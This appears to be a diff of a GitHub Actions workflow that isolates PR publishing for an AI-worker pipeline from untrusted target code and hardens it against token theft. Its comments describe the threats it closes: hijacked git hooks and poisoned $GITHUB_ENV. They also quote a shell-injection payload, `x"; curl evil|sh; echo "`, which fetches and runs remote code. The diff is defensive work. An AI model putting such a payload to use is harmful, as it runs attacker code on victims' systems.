-      # failure is already surfaced by the `gate`/`pr` steps' own nonzero exits and the gate's
+      # failure is already surfaced by the `gate`/`bundle` steps' own nonzero exits and the gate's
       # verbatim output in the job log. The annotation carries ONLY bounded, host-derived values: the
       # class of failure (which step outcome) and the resolved WORKER_PACKAGES atom(s). It deliberately
       # echoes NO target-controlled content (no raw gate stderr, no CLI stderr, no transcript, no
       # account handle / credential paths), so there is no path for hostile cargo output to reach it.
+      #
+      # [issue #575] The terminal condition is now `gate`/`bundle`, not `pr`: this job no longer
+      # opens the pull request. A run that gets past both hands off to the isolated `publish` job,
+      # whose own red tick (and the always() `final_state` deferral) is the signal from there on.
       - name: Preserve live-attempt failure signal (annotation only)
-        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.budget.outputs.exhausted != 'true' && steps.trust.outcome == 'success' && steps.pr.outcome != 'success' }}
+        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.budget.outputs.exhausted != 'true' && steps.trust.outcome == 'success' && (steps.gate.outcome != 'success' || steps.bundle.outcome != 'success') }}
         continue-on-error: true
         env:
           GATE_OUTCOME: ${{ steps.gate.outcome }}
           MODEL_OUTCOME: ${{ steps.model.outcome }}
-          PR_OUTCOME: ${{ steps.pr.outcome }}
+          BUNDLE_OUTCOME: ${{ steps.bundle.outcome }}
           RESOLVED_PACKAGES: ${{ needs.resolve.outputs.packages }}
         run: |
           set -uo pipefail
-          echo '::warning::Live worker attempt did not open its target pull request (model outcome='"${MODEL_OUTCOME:-?}"', gate outcome='"${GATE_OUTCOME:-?}"', pr outcome='"${PR_OUTCOME:-?}"').'
+          echo '::warning::Live worker attempt produced no publishable work (model outcome='"${MODEL_OUTCOME:-?}"', bundle outcome='"${BUNDLE_OUTCOME:-?}"', gate outcome='"${GATE_OUTCOME:-?}"').'
           if [[ "${MODEL_OUTCOME:-}" == "success" && "${GATE_OUTCOME:-}" != "success" ]]; then
             echo '::warning::The model produced work but the local gate did not pass for package atom(s) ['"${RESOLVED_PACKAGES:-?}"'] — the gate error is in this run job log above (the Run policy-selected local gate step output); no artifact is produced by design (credential-safety).'
           fi
+
+  # ISSUE #575 — the isolated publisher. The `worker` job runs the target's own gate (arbitrary
+  # target-controlled build scripts and tests) as the runner user; it used to then commit, push,
+  # open the DRAFT PR and file follow-up issues ON THE SAME RUNNER, executing a MUTABLE registry
+  # script (`registry/scripts/worker-live.sh`, a sibling checkout the gate can write) with a
+  # contents/workflows/issues/PR-capable App token in GH_TOKEN. Gated target code could therefore
+  # capture that token or publish arbitrary post-gate content through four surfaces: rewriting the
+  # publisher script, poisoning $GITHUB_ENV/$GITHUB_PATH for later steps, leaving a detached
+  # process alongside the token-bearing ones, and planting a `.git/hooks/pre-commit` that ran with
+  # GH_TOKEN inherited (the old publish path used a plain `git commit`, no --no-verify).
+  #
+  # This job closes all four by extending the pattern `final_state`/`provenance`/`model_health`/
+  # `release` already use: a FRESH runner that executes NO target code and NO target-writable
+  # script. The model's work crosses as INERT DATA — the digest-bound bundle sealed before the gate
+  # — and is reconstructed here with `git apply` onto a fresh checkout of the pre-gate base, hooks
+  # neutralised. Nothing from the bundle is ever executed.
+  #
+  # FAIL-CLOSED ORDERING: the artifact is verified against the pre-gate step outputs BEFORE the App
+  # token is minted, so a mismatched / oversized / unreadable bundle never causes a write-capable
+  # token to exist at all. Every refusal leaves pr_url empty, and the always() `final_state` job
+  # converges the issue to status:deferred (out of status:in-progress, back into the redispatch
+  # pool) exactly as it does for a timed-out worker. There is deliberately NO fallback that mints
+  # on the worker runner.
+  publish:
+    name: Publish DRAFT target pull request (no target code runs here)
+    # bundle_digest is non-empty only when the PRE-GATE seal succeeded, so a worker that was
+    # cancelled, timed out, produced no changes, or never launched the model skips this job
+    # entirely (empty outputs -> no publish -> deferred).
+    if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && needs.worker.outputs.bundle_digest != '' }}
+    needs: [resolve, claim, worker]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
+    # `dispatch-secrets` environment (deployment-branch policy: default branch only).
+    environment: dispatch-secrets
+    permissions:
+      contents: read
+    outputs:
+      pr_number: ${{ steps.pr.outputs.pr_number }}
+      pr_url: ${{ steps.pr.outputs.pr_url }}
+    steps:
+      - name: Checkout private registry (pinned, no persisted token)
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          path: registry
+          persist-credentials: false
+
+      # The artifact, the head branch and the `provenance` job's reconciliation branch are all keyed
+      # on `github.run_id`.`github.run_attempt`, so a PARTIAL re-run (re-running only this job, with
+      # the worker job's results preserved) finds no artifact for the new attempt and fails CLOSED
+      # to a deferral — never a PR on a branch `provenance` cannot reconcile, which is the worse of
+      # the two outcomes. A full re-run re-executes the worker and seals a fresh bundle.
+      - name: Download the pre-gate publish bundle (pinned)
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
+        with:
+          name: publish-bundle-${{ github.run_id }}-${{ github.run_attempt }}
+          path: ${{ runner.temp }}/publish-bundle
+
+      # BEFORE ANY TOKEN EXISTS. Re-derives the bundle digest from the downloaded artifact and
+      # compares it — plus the recorded target repo, base SHA, head branch and issue — against the
+      # PRE-GATE step outputs and this run's own trusted identity. worker-live.sh asserts that no
+      # GH_TOKEN is in scope here, so moving the mint above this step turns the check red rather
+      # than silently voiding the ordering property it exists to enforce.
+      - name: Verify the publish bundle against the pre-gate record (no token minted yet)
+        id: verify
+        env:
+          WORKER_BUNDLE_DIR: ${{ runner.temp }}/publish-bundle
+          WORKER_BUNDLE_DIGEST: ${{ needs.worker.outputs.bundle_digest }}
+          # The PRE-GATE base, cross-checked below against the revision `resolve` pinned the route
+          # (and the account claim) to: both are recorded before any target code ran.
+          WORKER_BUNDLE_BASE_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
+          # DETERMINISTIC head branch from trusted run identity — the SAME construction the
+          # `provenance` job reconciles on and worker-live.sh's run_model builds. Never taken from
+          # the bundle: the bundle must MATCH it or verification defers.
+          WORKER_BUNDLE_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
+          TARGET_REPO: ${{ inputs.target_repo }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          RESOLVED_SHA: ${{ needs.resolve.outputs.target_sha }}
+          RECORDED_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
+        run: |
+          set -euo pipefail
+          # The pre-gate base MUST be the revision the pre-hostile `resolve` job pinned the route
+          # to. A drift here means the worker rebased/re-pointed the checkout after routing, so the
+          # patch is not bound to reviewed state — defer rather than publish it.
+          [[ "$RECORDED_SHA" == "$RESOLVED_SHA" ]] || {
+            echo '::error::pre-gate base SHA is not the resolved routing revision — skipping publish'
+            exit 1
+          }
+          bash registry/scripts/worker-live.sh verify-bundle
+
+      # Minted only AFTER the bundle verified. Same scopes the old in-worker publish used, but now
+      # they exist on a runner that has never executed target code.
+      - name: Mint target-scoped App token for the verified publish
+        id: app-token-pub
+        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
+        with:
+          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
+          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
+          owner: ${{ needs.resolve.outputs.target_owner }}
+          repositories: ${{ needs.resolve.outputs.target_name }}
+          permission-contents: write
+          permission-issues: write
+          permission-pull-requests: write
+          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
+          # branches touching .github/workflows/* (role:ci issues were structurally blocked).
+          permission-workflows: write
+
+      # The publisher checks out the target at the PRE-GATE BASE — never at the worker's post-gate
+      # worktree, which is exactly the artefact this whole job exists to distrust. fetch-depth: 0
+      # because a push from a shallow clone can be refused by the remote.
+      - name: Checkout target at the pre-gate base (pinned, no persisted token)
+        if: ${{ needs.worker.outputs.gate_outcome == 'success' }}
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          repository: ${{ inputs.target_repo }}
+          ref: ${{ needs.worker.outputs.bundle_base_sha }}
+          path: target
+          token: ${{ steps.app-token-pub.outputs.token }}
+          fetch-depth: 0
+          persist-credentials: false
+
+      - name: Reconstruct, push, and open the DRAFT target pull request (review pending)
+        id: pr
+        # Gated on the GATE VERDICT that crossed as a value from the worker job. A failed gate
+        # publishes nothing; the follow-up step below still runs, matching the behaviour the old
+        # in-worker `always()` followups step had.
+        if: ${{ needs.worker.outputs.gate_outcome == 'success' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-pub.outputs.token }}
+          TARGET_DIR: ${{ github.workspace }}/target
+          TARGET_REPO: ${{ inputs.target_repo }}
+          TARGET_DEFAULT_BRANCH: ${{ needs.worker.outputs.default_branch }}
+          TARGET_BOT_LOGIN: ${{ needs.worker.outputs.bot_login }}
+          TARGET_BOT_ID: ${{ needs.worker.outputs.bot_id }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          WORKER_ROOT: ${{ runner.temp }}/publisher
+          WORKER_BUNDLE_DIR: ${{ runner.temp }}/publish-bundle
+          WORKER_BUNDLE_DIGEST: ${{ needs.worker.outputs.bundle_digest }}
+          WORKER_BUNDLE_BASE_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
+          WORKER_BUNDLE_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
+        run: |
+          set -euo pipefail
+          mkdir -p "$WORKER_ROOT"
+          bash registry/scripts/worker-live.sh publish
+
+      - name: Create declared follow-up issues (discovered out-of-scope work)
+        id: followups
+        # The procedure for the orchestrator to capture work it discovers but must NOT do in this
+        # PR: the model appends {title, body, labels} lines to `.worker-followups.jsonl`, which
+        # worker-live.sh lifts out of the target tree BEFORE the seal (so it is never committed)
+        # and carries into the digest-bound bundle. That means the lines created here are exactly
+        # the lines that existed BEFORE the gate ran — the gate cannot add, edit or drop one.
+        # Best-effort; never fails the publisher. `always()` is load-bearing: a failed gate
+        # publishes no PR but its declared follow-ups must still be filed.
+        if: ${{ always() && steps.verify.outcome == 'success' }}
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ steps.app-token-pub.outputs.token }}
+          SPEC_FILE: ${{ runner.temp }}/publish-bundle/followups.jsonl
+        run: |
+          set -uo pipefail
+          [[ -f "$SPEC_FILE" ]] || { echo 'no declared follow-ups in the verified bundle'; exit 0; }
+          for l in from:agent self-improvement; do
+            gh label create "$l" -R "${{ inputs.target_repo }}" --color ededed \
+              --description "worker-discovered follow-up" 2>/dev/null || true
+          done
+          python3 registry/scripts/worker-issue.py followup \
+            --repo "${{ inputs.target_repo }}" \
+            --issue "${{ inputs.issue_number }}" \
+            --spec-file "$SPEC_FILE" || true
 
   # Final-state convergence runs as its OWN always() job (issue #127). The `worker` job runs the
   # model + host-side cargo gate under a hard `worker_timeout_minutes` timeout; a job timeout or a
@@ -1031,7 +1395,14 @@ jobs:
   final_state:
     name: Converge final target issue state (no target code runs here)
     if: ${{ always() && !inputs.dry_run && needs.resolve.result == 'success' && needs.claim.result == 'success' }}
-    needs: [resolve, claim, worker]
+    # #500: do not put a no_change issue back in the deferred frontier until its typed health
+    # record is durably attempted. The next dispatcher tick reads that validated ledger record;
+    # without this edge it could race the recorder and launch the old route a third time.
+    # always() above still converges to ordinary deferred state when telemetry itself fails.
+    # [issue #575] `publish` too: pr_url now comes from the isolated publisher, and convergence must
+    # observe its outcome rather than racing it. always() above keeps the deferral path intact — a
+    # skipped, failed or refused publisher leaves PR_URL empty and this job writes status:deferred.
+    needs: [resolve, claim, worker, publish, model_health]
     runs-on: ubuntu-latest
     timeout-minutes: 10
     # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
@@ -1063,22 +1434,36 @@ jobs:
           EXHAUSTED: ${{ needs.worker.outputs.exhausted }}
           TRUST_OUTCOME: ${{ needs.worker.outputs.trust_outcome }}
           ATTEMPT_NUMBER: ${{ needs.worker.outputs.attempt_number }}
+          ATTEMPT_VOIDED: ${{ needs.worker.outputs.attempt_voided }}
           MAX_ATTEMPTS: ${{ needs.resolve.outputs.max_attempts }}
-          PR_URL: ${{ needs.worker.outputs.pr_url }}
+          PR_URL: ${{ needs.publish.outputs.pr_url }}
         run: |
           set -euo pipefail
           status=deferred
           if [[ "$ACQUIRED" == true && "$EXHAUSTED" == true ]]; then
-            status=needs-user
+            # Attempt-budget exhaustion is BUDGET-driven, not a human question: the
+            # machine-owned status:parked soft hold (scripts/park_policy.py defect 1), never
+            # needs:user — worker-issue.py enforces the sticky human-unpark veto on the write.
+            status=parked
           elif [[ "$ACQUIRED" == true && -n "$PR_URL" ]]; then
             # Completion is DEFERRED to the review-fix ARM path (the issue closes only when its
             # PR is approved cross-provider and armed); the review loop owns it from here.
             status=in-progress-review
           elif [[ "$ACQUIRED" == true && "$TRUST_OUTCOME" == success \
+                  && "$ATTEMPT_VOIDED" != true \
                   && "$ATTEMPT_NUMBER" =~ ^[1-9][0-9]*$ \
                   && "$MAX_ATTEMPTS" =~ ^[1-9][0-9]*$ \
                   && "$ATTEMPT_NUMBER" -ge "$MAX_ATTEMPTS" ]]; then
-            status=needs-user
+            # Final allowed attempt ran without publishing a PR: the same budget-driven park.
+            #
+            # [registry #596] ...unless the attempt was VOIDED as a credential outage. This arm reads
+            # ATTEMPT_NUMBER, which the void cannot retroactively lower, so without this guard a
+            # final-attempt `auth` failure still parked the issue — the exact "credential rot
+            # silently converts into a park" inversion the void exists to stop. The park POLICY is
+            # untouched: an unvoided final attempt parks exactly as before, and the issue falls
+            # through to `deferred` so the next tick re-derives the (now un-charged) budget and
+            # re-dispatches.
+            status=parked
           fi
           # FAIL LOUD on a failed write (issue #127): the old in-job step swallowed this as a
           # ::warning:: and left the issue stranded status:in-progress. A red job here is the
@@ -1110,7 +1495,14 @@ jobs:
   provenance:
     name: Reconcile + record implementer provenance (no target code runs here)
     if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
-    needs: [resolve, claim, worker]
+    # [issue #575] `publish` is now the job that creates the PR, so the reconciliation must run
+    # AFTER it or it would enumerate a PR that does not exist yet. The ROOT OF TRUST is unchanged:
+    # this job still derives the head branch from run identity and re-reads the PR from the live
+    # API — it does not consume needs.publish.outputs.pr_number, so a publisher that reported
+    # nothing (or reported the wrong thing) cannot steer the record. always() keeps the
+    # lost-response recovery path #128 added: a publisher that died after server-side creation is
+    # still reconciled from the deterministic branch.
+    needs: [resolve, claim, worker, publish]
     runs-on: ubuntu-latest
     timeout-minutes: 10
     # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT + REGISTRY_ADMIN_APP_ID/KEY, which
@@ -1156,13 +1548,19 @@ jobs:
           HEAD_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
           # `<app-slug>[bot]` == the login the worker's `target` step verifies via /users/<slug>[bot].
           VERIFY_BOT_LOGIN: ${{ steps.app-token-recon.outputs.app-slug }}[bot]
+          # Catalog-controlled account fields reach this contents:write + PROVENANCE_SALT job via
+          # env ONLY — never interpolated into the run: shell source, where a provider/alias like
+          # `x"; curl evil|sh; echo "` would execute (issue #199). worker-pr.py re-validates the
+          # provider server-side (provenance_record: must be anthropic|openai).
+          IMPL_PROVIDER: ${{ needs.claim.outputs.provider }}
+          IMPL_ALIAS: ${{ needs.claim.outputs.model }}
         run: |
           python3 registry/scripts/worker-pr.py reconcile-provenance \
             --registry-repo "$GITHUB_REPOSITORY" \
             --target-repo "${{ inputs.target_repo }}" \
             --head-branch "$HEAD_BRANCH" \
-            --impl-provider "${{ needs.claim.outputs.provider }}" \
-            --impl-alias "${{ needs.claim.outputs.model }}" \
+            --impl-provider "$IMPL_PROVIDER" \
+            --impl-alias "$IMPL_ALIAS" \
             --issue "${{ inputs.issue_number }}" \
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
             --verify-bot-login "$VERIFY_BOT_LOGIN"
@@ -1200,6 +1598,13 @@ jobs:
   model_health:
     name: Record model-access health (no target code runs here)
     if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && needs.worker.outputs.exit_class != '' }}
+    # [issue #575] Deliberately NOT rewired onto `publish`. This job records the MODEL LAUNCH
+    # outcome, which is fully determined before the gate and carries no PR identity — the exit
+    # class it consumes is a pre-gate worker step output. The classes that matter most here
+    # (auth/credential outages, session limits) are exactly the ones where no bundle exists and the
+    # publisher never runs, so a needs edge would delay — and on the `final_state` chain
+    # (final_state needs model_health) could strand — the health record behind a job that has
+    # nothing to say about it.
     needs: [resolve, claim, worker]
     runs-on: ubuntu-latest
     timeout-minutes: 10
@@ -1224,18 +1629,37 @@ jobs:
           # salts the handle so only the 16-hex hash is stored. This job runs no target code.
           WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
           PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
+          # Catalog-controlled (provider/alias) and provider-derived (reset-hint from a rate-limit
+          # response) fields reach this contents:write + PROVENANCE_SALT job via env ONLY — never
+          # in the run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
+          # model-health.py record re-validates the provider against {anthropic, openai, fleet}.
+          PROVIDER: ${{ needs.claim.outputs.provider }}
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
+          EXIT_CLASS: ${{ needs.worker.outputs.exit_class }}
+          RESET_HINT: ${{ needs.worker.outputs.reset_hint }}
+          # The attempt of the worker job that PRODUCED the outcome — never this recorder job's
+          # own $GITHUB_RUN_ATTEMPT (review round 1 of #425): a recorder-only retry replays the
+          # worker's preserved output (same attempt -> the script dedups the replay), while a
+          # full re-run re-executes the worker, whose fresh attempt keeps the genuinely new
+          # outcome countable. The empty-output fallback below fails toward RECORDING (a rare
+          # duplicate beats a silently dropped outcome).
+          OUTCOME_ATTEMPT: ${{ needs.worker.outputs.outcome_attempt }}
         run: |
           python3 registry/scripts/model-health.py record \
-            --provider "${{ needs.claim.outputs.provider }}" \
-            --model-alias "${{ needs.claim.outputs.model }}" \
-            --exit-class "${{ needs.worker.outputs.exit_class }}" \
-            --reset-hint "${{ needs.worker.outputs.reset_hint }}" \
-            --run-id "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
+            --provider "$PROVIDER" \
+            --model-alias "$MODEL_ALIAS" \
+            --exit-class "$EXIT_CLASS" \
+            --reset-hint "$RESET_HINT" \
+            --run-id "$GITHUB_RUN_ID.${OUTCOME_ATTEMPT:-$GITHUB_RUN_ATTEMPT}"
 
   release:
     name: Always release live account lease
     if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
-    needs: [claim, worker]
+    # [issue #575] `publish` too: freeing the account lease is what lets the dispatcher pick this
+    # issue up again, so releasing while the publisher is still opening the PR would let the next
+    # tick race an in-flight publish. always() is unchanged, so the lease is STILL released on
+    # every path — including a publisher that failed, was refused, or was skipped entirely.
+    needs: [claim, worker, publish]
     runs-on: ubuntu-latest
     timeout-minutes: 10
     permissions:
